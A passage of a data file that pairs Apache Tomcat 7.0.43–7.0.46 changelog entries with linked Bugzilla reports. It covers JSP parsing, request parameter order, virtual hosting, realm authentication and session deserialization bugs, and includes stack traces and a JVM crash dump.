RBX=0x00007f49280011d0 is an unknown value
RCX=0x0000000000000000 is an unknown value
RDX=0x00007f4b59534128 is pointing into the stack for thread: 0x00007f4928010000
RSP=0x00007f4b59534110 is pointing into the stack for thread: 0x00007f4928010000
RBP=0x00007f49280101e8 is an unknown value
RSI=0x00007f4b59534130 is pointing into the stack for thread: 0x00007f4928010000
RDI=0x0000000000000000 is an unknown value
R8 =0x00007f4b59534130 is pointing into the stack for thread: 0x00007f4928010000
R9 =0x0000000000000001 is an unknown value
R10=0x00007f4b8d01852d is at code_begin+1197 in an Interpreter codelet
method entry point (kind = native)  [0x00007f4b8d018080, 0x00007f4b8d018e80]  3584 bytes
R11=0x00007f4b985e3ed0: <offset 0x183ed0> in /lib/x86_64-linux-gnu/libc.so.6 at 0x00007f4b98460000
R12=0x0000000000000000 is an unknown value
R13=0x0000000000000000 is an unknown value
R14=0x00007f4b59536210 is pointing into the stack for thread: 0x00007f4928010000
R15=0x00007f4928010000 is a thread


Stack: [0x00007f4b59437000,0x00007f4b59538000],  sp=0x00007f4b59534110,  free space=1012k
Native frames: (J=compiled Java code, j=interpreted, Vv=VM code, C=native code)
C  [libtcnative-1.so.0.1.27+0x129dd]  Java_org_apache_tomcat_jni_Socket_send+0x15d

Java frames: (J=compiled Java code, j=interpreted, Vv=VM code)
j  org.apache.tomcat.jni.Socket.send(J[BII)I+0
j  org.apache.coyote.http11.upgrade.UpgradeAprProcessor.write(I)V+14
j  org.apache.coyote.http11.upgrade.UpgradeOutbound.write(I)V+5
j  org.apache.catalina.websocket.WsOutbound.doWriteBytes(Ljava/nio/ByteBuffer;Z)V+68
j  org.apache.catalina.websocket.WsOutbound.doWriteText(Ljava/nio/CharBuffer;Z)V+65
j  org.apache.catalina.websocket.WsOutbound.writeTextMessage(Ljava/nio/CharBuffer;)V+44
j  com.company.app.handler.log.chat.ChatWebSocketServlet.broadcast(Ljava/lang/String;)V+66
j  com.company.app.handler.log.chat.ChatWebSocketServlet$ChatMessageInbound.onOpen(Lorg/apache/catalina/websocket/WsOutbound;)V+46
j  org.apache.catalina.websocket.StreamInbound.onUpgradeComplete()V+22
j  org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(Lorg/apache/tomcat/util/net/SocketWrapper;Lorg/apache/tomcat/util/net/SocketStatus;)Lorg/apache/tomcat/util/net/AbstractEndpoint$Handler$SocketState;+224
j  org.apache.tomcat.util.net.AprEndpoint$SocketWithOptionsProcessor.run()V+167
j  java.util.concurrent.ThreadPoolExecutor.runWorker(Ljava/util/concurrent/ThreadPoolExecutor$Worker;)V+95
j  java.util.concurrent.ThreadPoolExecutor$Worker.run()V+5
j  java.lang.Thread.run()V+11
v  ~StubRoutines::call_stub"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55602
Coyote|Tomcat 7.0.46 (violetagg)|fix||Update the APR/native connector to version 1.1.29. (violetagg)|||
Jasper|Tomcat 7.0.46 (violetagg)|fix|55642|Correct logic error in the JSP parser that was incorrectly identifying EL expressions in jsp:param element values as a literal string. (markt)|TagPluginManager isConstantAttribute broken|"Function isConstantAttribute in TagPluginManager seems to be be broken.
For value ""order.status"" it returns false. And for value ""${order.state.name}"" it returns true. According to javadoc it should be exact opposite.

Problem seems to be in Node.isLiteral function. ""el!= null"" should probably be ""el== null"" But this function is being used elsewhere.


/**
* @return true if the attribute is specified and its value is a
*         translation-time constant.
*/
public boolean TagPluginManager.isConstantAttribute(String attribute){
    Node.JspAttribute attr = getNodeAttribute(attribute);
    if (attr == null)
        return false;
    return attr.isLiteral();
}
/**
* @return true if the value is a string literal known at translation
*         time.
*/
public boolean isLiteral() {
    return !expression && (el != null) && !namedAttribute;
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55642
Cluster|Tomcat 7.0.46 (violetagg)|add||Add support for notify periodic event of cluster. (kfujino)|||
Web applications|Tomcat 7.0.46 (violetagg)|fix||Correct the javadoc for org.apache.catalina.Lifecycle. (kfujino)|||
Web applications|Tomcat 7.0.46 (violetagg)|add||Add document for sessionIdAttribute attribute in org.apache.catalina.ha.session.JvmRouteBinderValve. (kfujino)|||
Web applications|Tomcat 7.0.46 (violetagg)|fix||Handle the case when a user closes the browser whilst playing the snake game in the JSR356 WebSocket examples. (markt)|||
Web applications|Tomcat 7.0.46 (violetagg)|fix||Ensure Javadoc comments are associated with the correct elements in org.apache.tomcat.jni.Poll. (markt)|||
Web applications|Tomcat 7.0.46 (violetagg)|add||"Expand Context documentation for the use of sessionCookiePath=""/"" to make the implications for session fixation protection clearer. (markt)"|||
Web applications|Tomcat 7.0.46 (violetagg)|fix|55629|Ensure that the JMX notification listener added during initialization of the servlet org.apache.catalina.manager.StatusManagerServlet is removed in the destroy phase. (violetagg)|StatusManagerServlet does not remove JMX notification listener|StatusManagerServlet.destroy should call mBeanServer.removeNotificationListener because init method call mBeanServer.addNotificationListener.|https://bz.apache.org/bugzilla/show_bug.cgi?id=55629
Web applications|Tomcat 7.0.46 (violetagg)|fix||Correct the documentation for Deployment Organization in the App Dev Guide. (violetagg)|||
Web applications|Tomcat 7.0.46 (violetagg)|add|55639|Add a Drawboard WebSocket example. (kpreisser)|Add Drawboard Websocket Example|"Created attachment 30909 [details]
Patch to add the Drawboard example

Hi,

I would like to add this Drawboard example to Tomcat's Websocket examples.

It is a page where you can draw with your mouse or touch input (using different colors) and everybody else which has the page open will immediately see what you are drawing.
If someone opens the page later, they will get the current room image (so they can see what was already drawn by other people).

It uses asynchronous sending of messages so that it doesn't need separate threads for each client to send messages (this needs NIO or APR connector to be used).
A ""Room"" (where the drawing happens) has a dedicated thread because the actions which are done in one Room are single-threaded (like drawing to a BufferedImage). If multiple rooms were used, then each Room would have its own dedicated thread (but currently only one Room is implemented).

When you open the page, first you will receive a binary websocket message containing the current room image as PNG image. After that, you will receive string messages that contain the drawing actions (line from x1,y1 to x2,y2).
Note that it currently only uses simple string messages instead of JSON because I did not want to introduce a dependency on a JSON lib.

It uses synchronization mechanisms to ensure that the final image will look the same for every user, regardless of what their network latency/speed is - e.g. if two user draw at the same time on the same place, the server will decide which line was the first one, and that will be reflected on every client.

What do you think?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55639
Catalina|Tomcat 7.0.45 (violetagg)|add|55576|Preserve the order in which request parameters were received when accessing them via the Servlet API. (markt)|Order of ServletRequest parameters is not preserved|"The ServletRequest interface provides two methods to iterate through request parameters:

Enumeration<String> getParameterNames(), and
Map<String, String[]> getParameterMap()

Unfortunately, the underlying implementation in Tomcat is a HashMap, which fails to preserve the order of parameters as they are specified in the request.

An alternate implementation should be used to preserve request order.  LinkedHashMap, for example, is capable of preserving insertion order.

The Servlet Specification (v3.0) speaks only to the relative ordering of query string data and post body data. However, section 17.13.3 of the HTML specification (v4.01) titled ""Processing form data"", clearly states that ""control names/values are listed in the order they appear in the document.""

Therefore, I do not see a valid interpretation of either specification to rationalize Tomcat's implementation. To receive a request with an ordered list of parameters and represent them in an implementation that is guaranteed not to preserve this order is difficult to rationalize."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55576
Cluster|Tomcat 7.0.45 (violetagg)|fix||Logger instance of cluster session manager is changed to non-static in order to enable logging of each application. (kfujino)|||
Jasper|Tomcat 7.0.44 (violetagg)|fix|55582|Correct concurrency issue that can result in two instances of JspServletWrapper being created for one tag Patch provided by Sheldon Shao. (markt)|Concurrent issue of TagFileProcessor|"Created attachment 30871 [details]
Unsynchronized getting wrapper from RuntimeContext

The following code has concurrent issue.

        JspRuntimeContext rctxt = ctxt.getRuntimeContext();
        JspServletWrapper wrapper = rctxt.getWrapper(wrapperUri);

        synchronized (rctxt) {
            if (wrapper == null) {

               ....
It creates duplicated JspServletWrapper in this scenario,

A.jsp --> C.tag
B.jsp --> C.tag

A.jsp and B.jsp are both compiling and come to the given lines.
Two threads all get null from JspRuntimeContext(JspServletWrapper == null).
So two instances of JspServletWrapper was created."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55582
Catalina|Tomcat 7.0.43 (violetagg)|add|51526|o.a.catalina.startup.Tomcat#addWebapp methods now process the web application's META-INF/context.xml when it is available in the provided path. (violetagg)|Process web application context config with embedded Tomcat.addWebApp(...)|It would be nice if org.apache.catalina.startup.Tomcat.addWebApp(...) would process the web application's META-INF/context.xml if found.  The current implementation skips META-INF/context.xml loading, and does not appear to offer any hook to enable it--the StandardContext is instantiated and initialized with a null configFile in the single call to addWebApp(...).|https://bz.apache.org/bugzilla/show_bug.cgi?id=51526
Catalina|Tomcat 7.0.43 (violetagg)|fix|55186|Ensure local name is recycled between requests so IP virtual hosting works correctly. (markt)|useIPVHosts=true , incorrect to get Request.localName|"I configured useIPVHosts=true.
&set up two hosts :
<Host name=""localhost"" appBase=""webapps"" />
<Host name=""www.jm.com"" appBase=""webapps2"" />
&my pc has two ip: 10.10.4.48 and 192.168.56.1
&HOSTS file is:
~~~~~~~~~~~~~~~~~~
127.0.0.1 localhost
192.168.56.1 www.jm.com
~~~~~~~~~~~~~~~~~~
& the Host localhost has a app named examples. the other Host www.jm.com has a app named examples2.

start Tomcat,
visit http://www.jm.com:8080/examples2/test/ is ok. but i changed to visit 
http://localhost:8080/examples/test without restart tc, it didn't work.
then i traced the codes,i found that :
~~~~~~~~~~~~~~~~~~~~~~~
        if (connector.getUseIPVHosts()) {
            serverName = req.localName(); //line 624
            if (serverName.isNull()) {
                // well, they did ask for it
                res.action(ActionCode.REQ_LOCAL_NAME_ATTRIBUTE, null);
            }
        } else {
            serverName = req.serverName();
        }
~~~~~~~~~~~~~~~~~~~~~~~
at line 624 the value of serverName is still ""www.jm.com"" . it will still find  the Host www.jm.com to handle with the request.but this host doesn't have the examples app, so it can't make it.

if i annotate the ""if condition"" , it works.
~~~~~~~~~~~~~~~~~~~~~
if (connector.getUseIPVHosts()) {
            serverName = req.localName(); //line 624
            //if (serverName.isNull()) { 
//annotate if , execute action every time.
                // well, they did ask for it
                res.action(ActionCode.REQ_LOCAL_NAME_ATTRIBUTE, null);
            //}
        } else {
            serverName = req.serverName();
        }
~~~~~~~~~~~~~~~~~~~~"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55186
Catalina|Tomcat 7.0.43 (violetagg)|fix|55210|Correct the processing of the provider-configuration file for javax.servlet.ServletContainerInitializer in the resource directory META-INF/services when this file contains comments and multiple SCIs. Patch provided by Nick Williams. (violetagg)|SEVERE: The ServletContentInitializer [# Licensed to the Apache Software Foundation (ASF) under one or more] could not be created|"According to the Javadoc for java.util.ServiceLoader (http://docs.oracle.com/javase/6/docs/api/java/util/ServiceLoader.html):

[quote]A service provider is identified by placing a provider-configuration file in the resource directory META-INF/services. The file's name is the fully-qualified binary name of the service's type. The file contains a list of fully-qualified binary names of concrete provider classes, one per line. Space and tab characters surrounding each name, as well as blank lines, are ignored. The comment character is '#' ('\u0023', NUMBER SIGN); on each line all characters following the first comment character are ignored. The file must be encoded in UTF-8.[/quote]

However, based on the error below it appears that Tomcat does not abide by this requirement. The Log4j Core JAR for 2.0-beta8 will have a ServletContainerInitializer in it, and the provider-configuration file for this SCI contains a copyright statement. Tomcat barfs and fails to deploy the application due to this copyright statement.

This problem exists in both Tomcat 7 and Tomcat 8.

SEVERE: The ServletContentInitializer [# Licensed to the Apache Software Foundation (ASF) under one or more] could not be created
java.lang.ClassNotFoundException: # Licensed to the Apache Software Foundation (ASF) under one or more
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1465)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1310)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:339)
	at org.apache.catalina.startup.ContextConfig.getServletContainerInitializer(ContextConfig.java:1526)
	at org.apache.catalina.startup.ContextConfig.processServletContainerInitializers(ContextConfig.java:1436)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1174)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:814)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:321)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5100)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:726)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:702)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:698)
	at org.apache.catalina.startup.HostConfig.manageApp(HostConfig.java:1491)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:491)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:300)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:792)
	at org.apache.catalina.mbeans.MBeanFactory.createStandardContext(MBeanFactory.java:468)
	at org.apache.catalina.mbeans.MBeanFactory.createStandardContext(MBeanFactory.java:415)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:491)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:300)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:792)
	at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1465)
	at javax.management.remote.rmi.RMIConnectionImpl.access$300(RMIConnectionImpl.java:75)
	at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1306)
	at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1398)
	at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImpl.java:827)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:491)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:322)
	at sun.rmi.transport.Transport$1.run(Transport.java:177)
	at sun.rmi.transport.Transport$1.run(Transport.java:174)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:173)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:556)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:811)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:670)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55210
Catalina|Tomcat 7.0.43 (violetagg)|fix|55230|Use the correct resource path when obtaining an InputStream for resources served by a ProxyDirContext. (markt)|DirContextURLConnection.getInputStream() fails to reopen resources for ProxyDirContext|"There appears to be a bug in the DirContextURLConnection where it fails to reopen the resource in the getInputStream method when its context is a ProxyDirContext.

The DirContextURLConnection's connect method has some special case code for the ProxyDirContext where it's stripping the hostName and the contextPath off of the path given by the URL, and then using that stripped path in its context.lookup call. This part works great.

However, in the getInputStream method the DirContextURLConnection attempts to reopen the resource without doing this special case logic on the path used in the context lookup. It tries to look up the resource with the raw path from the URL object, which fails. A NamingException is thrown, which is swallowed, and the potentially stale resource from the initial call to connect is returned instead.


In my application this isn't causing a logic issue because the resources I'm looking up aren't changing between the initial connection and the first call to getInputStream, but this bug is manifesting as a notable performance problem. Every time a bad path is passed into the ProxyDirContext it's actually causing quite a lot of NamingExceptions to be thrown as it tries alternative paths (see BaseDirContext.lookup). All of these exceptions are swallowed but what I'm seeing is that this is happening many times over the course of a request as my application is looking up different resources, and the time it takes to build all of these swallowed NamingExceptions has become significant."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55230
Catalina|Tomcat 7.0.43 (violetagg)|fix||Ensure that the JAR scanning process scans the Apache Log4j version 2 JARs. Patch provided by Nick Williams. (markt)|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55261|Fix failing unit test for file upload checks when running on platform / JVM combinations that have large network buffers. (markt)|TestSwallowAbortedUploads fails|"With a fresh checkout of 7.0.x I am seeing failures with TestSwallowAbortedUploads under both BIO and NIO. Are there issues with this test case? 

Macintosh OS X 10.8.4

java version ""1.6.0_51""
Java(TM) SE Runtime Environment (build 1.6.0_51-b11-457-11M4509)
Java HotSpot(TM) 64-Bit Server VM (build 20.51-b01-457, mixed mode)

The same test passes with trunk using Java7."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55261
Catalina|Tomcat 7.0.43 (violetagg)|fix|55268|Added optional --service-start-wait-time command-line option to change service start wait time from default of 10 seconds.|daemon.sh only waits for 10 seconds|"I'm trying to use daemon.sh to start tomcat, but it passes a wait value of 10 seconds to jsvc.  Tomcat does still start up ok, but the shell script's return code is 1, which is causing my puppet script to fail.

It would be useful if this could be parameterised so that I can choose a time suitable for my webapps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55268
Catalina|Tomcat 7.0.43 (violetagg)|fix||The contextClass attribute of HostConfig refers to the value of the contextClass attribute of Host. (kfujino)|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55331|Dispatching to an asynchronous servlet from AsyncListener.onTimeout() should not trigger an IllegalStateException. (markt)|Dispatch after async timeout fails|"With Tomcat 7.0.42 and the NIO connector, calling AsyncContext.dispatch() from an onTimeout() handler fails with this error message:

jul 31, 2013 1:40:30 PM org.apache.coyote.AbstractProtocol$AbstractConnectionHandler process
SEVERE: Error reading request, ignored
java.lang.IllegalStateException: Calling [asyncPostProcess()] is not valid for a request with Async state [STARTED]
        at org.apache.coyote.AsyncStateMachine.asyncPostProcess(AsyncStateMachine.java:204)
        at org.apache.coyote.AbstractProcessor.asyncPostProcess(AbstractProcessor.java:116)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:593)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1690)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:724)


Test code:

public class AsyncServlet extends HttpServlet {

  protected void doGet(final HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {

    if (request.isAsyncStarted()) {
      response.getWriter().write(""asyncResult="" + request.getAttribute(""asyncResult""));
    }
    else {
      final AsyncContext asyncContext = request.startAsync(request, response);

      asyncContext.addListener(new AsyncListener() {
        public void onTimeout(AsyncEvent event) throws IOException {
            request.setAttribute(""asyncResult"", ""timeout\n"");
            asyncContext.dispatch();
        }
        public void onStartAsync(AsyncEvent event) throws IOException {}
        public void onError(AsyncEvent event) throws IOException {}
        public void onComplete(AsyncEvent event) throws IOException {}
      });

      asyncContext.setTimeout(5000L);
    }
  }

}


This seems somewhat similar to the (ancient) report #50308."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55331
Catalina|Tomcat 7.0.43 (violetagg)|fix|55333|Correct a regression in the fix for 55071. (markt)|JDBCRealm Digest authentication Flow is not working throws Function sequence error|"Issue: Digest authentication flow is not working
Error Thrown : Function sequence error

PackageName: org.apache.catalina.realm
ClassName : JDBCRealm
MethodName: String getPassword(String username)

Snapshot from above mentioned method
===================================
 stmt = credentials(dbConnection, username);
 rs = stmt.executeQuery();
 // Due to this connection commit,  resultset is nullified 
 dbConnection.commit();
 
 // While executing this statement it throws Function sequence error
 if (rs.next()) {
    dbCredentials = rs.getString(1);
 }

===================================

Above explanation has been validate by placing 7.0.41 catalina.jar where the above changes are not there due to fix of 55071 bug
 

Below snapshot is the error observed while trying for Digest authentication
========================================================================== 

Jul 31, 2013 3:43:40 PM org.apache.catalina.realm.JDBCRealm getPassword

SEVERE: Exception performing authentication

java.sql.SQLException: [TimesTen][TimesTen 11.2.2.5.0 ODBC Driver]Function sequence error

    at com.timesten.jdbc.JdbcOdbc.createSQLException(JdbcOdbc.java:3238)

    at com.timesten.jdbc.JdbcOdbc.standardError(JdbcOdbc.java:3387)

    at com.timesten.jdbc.JdbcOdbc.SQLFetch(JdbcOdbc.java:921)

    at com.timesten.jdbc.JdbcOdbcResultSet.next(JdbcOdbcResultSet.java:409)

    at org.apache.catalina.realm.JDBCRealm.getPassword(JDBCRealm.java:558)

    at org.apache.catalina.realm.RealmBase.getDigest(RealmBase.java:1189)

    at org.apache.catalina.realm.RealmBase.authenticate(RealmBase.java:409)

    at com.kodiak.digest.authentication.KnDigestAuthenticator$KnDigestInfo.authenticate(KnDigestAuthenticator.java:733)

    at com.kodiak.digest.authentication.KnDigestAuthenticator.authenticate(KnDigestAuthenticator.java:275)

    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:574)

    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)

    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)

    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)

    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)

    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)

    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1023)

    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)

    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)

    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)

    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)

    at java.lang.Thread.run(Thread.java:724)

 

Jul 31, 2013 3:43:40 PM org.apache.catalina.realm.JDBCRealm getPassword

SEVERE: Exception performing authentication

java.sql.SQLException: [TimesTen][TimesTen 11.2.2.5.0 ODBC Driver]Function sequence error

    at com.timesten.jdbc.JdbcOdbc.createSQLException(JdbcOdbc.java:3238)

    at com.timesten.jdbc.JdbcOdbc.standardError(JdbcOdbc.java:3387)

    at com.timesten.jdbc.JdbcOdbc.SQLFetch(JdbcOdbc.java:921)

    at com.timesten.jdbc.JdbcOdbcResultSet.next(JdbcOdbcResultSet.java:409)

    at org.apache.catalina.realm.JDBCRealm.getPassword(JDBCRealm.java:558)

    at org.apache.catalina.realm.RealmBase.getDigest(RealmBase.java:1189)

    at org.apache.catalina.realm.RealmBase.authenticate(RealmBase.java:409)

""localhost.2013-07-31.log"" 50L, 3800C         

Cheers,
Mahaaboob"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55333
Catalina|Tomcat 7.0.43 (violetagg)|fix||When using a security manager, ensure that calls to the ServletContext that are routed via an AccessController.doPrivileged block do not result in a call to a different underlying method on the ServletContext. (markt)|||
Catalina|Tomcat 7.0.43 (violetagg)|fix|55354|Ensure that the naming context environment parameters are restored after associating the Principle with the user name. Based on patch provided by Richard Begg. (violetagg)|JNDIRealm.getPrincipal(context,username,gssCredential) corrupts realm context|"The getPrincipal(context,username,gssCredential) method in JNDIRealm is designed to allow delegated credentials to be applied to the directory server connection as part of SPNEGO authentication.

This is done by manipulation of a number of the directory context's environment parameters.

However, as currently implemented, these environment parameters are forcibly cleared after the getUser() call regardless of whether the values were even changed (i.e. if isUseDelegatedCredential() returned false).

If the container realm is defined to use GSSAPI authentication, only the first SPNEGO authentication request will succeed.  All subsequent requests will fail with this exception:
javax.naming.NamingException: [LDAP: error code 1 - 000004DC: LdapErr: DSID-0C0906DC, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db0 

The exception is due to the Context.SECURITY_AUTHENTICATION being cleared by getPrincipal() - resulting in a attempted ""simple"" bind with no username/password (i.e. anonymous).

A workaround is to ensure that the connectionName and connectionPassword parameters are specified in the realm definition - however, if one is using GSSAPI - this shouldn't be necessary and certainly defeats the purpose of using GSSAPI in the first place.

The code should preserve pre-existing environment parameters in the context before changing them, then restore those values afterwards - rather than just clearing the settings completely."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55354
Catalina|Tomcat 7.0.43 (violetagg)|fix|55357|Ensure the web application class loader is set as a thread context class loader during session deserialization. (violetagg)|Cannot deserialize session when it contains Externalizable objects (using PersistentManager)|"I'm using PersistentManager with JDBCStore to store sessions in my database. But in my webapplication, there is an object in my session which is an instance of org.apache.el.MethodExpressionImpl. This class implements the Externalizable interface but in this readExternal method it uses org.apache.el.util.ReflectionUtil.forName(String) which use Thread.currentThread().getContextClassLoader() as its ClassLoader.

It seems to be incorrect because this method return a StandardClassLoader which cannot find my classes in WEB-INF/lib directory of my webapp.

Is it the problem of the MethodExpressionImpl class which use this method or the JDBCStore which does not set the thread contextClassLoader as the WebappClassLoader ?

Here is the stacktrace :

SEVERE: Error processing request
java.lang.IllegalStateException: Erreur lors de la d√©s√©rialisation de la session 1634C328D27A31CB9FC4D52392FDB05F: {1}
	at org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:713)
	at org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:503)
	at org.apache.catalina.connector.Request.isRequestedSessionIdValid(Request.java:2391)
	at org.apache.catalina.connector.CoyoteAdapter.parseSessionCookiesId(CoyoteAdapter.java:954)
	at org.apache.catalina.connector.CoyoteAdapter.postParseRequest(CoyoteAdapter.java:688)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:402)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.ClassNotFoundException: javax.faces.event.ActionEvent
	at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
	at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:266)
	at org.apache.el.util.ReflectionUtil.forName(ReflectionUtil.java:62)
	at org.apache.el.util.ReflectionUtil.toTypeArray(ReflectionUtil.java:88)
	at org.apache.el.MethodExpressionImpl.readExternal(MethodExpressionImpl.java:290)
	at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:1835)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1794)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
	at com.sun.facelets.el.TagMethodExpression.readExternal(TagMethodExpression.java:101)
	at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:1835)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1794)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1989)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1913)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
	at java.util.ArrayList.readObject(ArrayList.java:733)
	at sun.reflect.GeneratedMethodAccessor90.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1004)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1891)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1796)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1348)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1342)
	at java.io.ObjectInputStream.readArray(ObjectInputStream.java:1704)
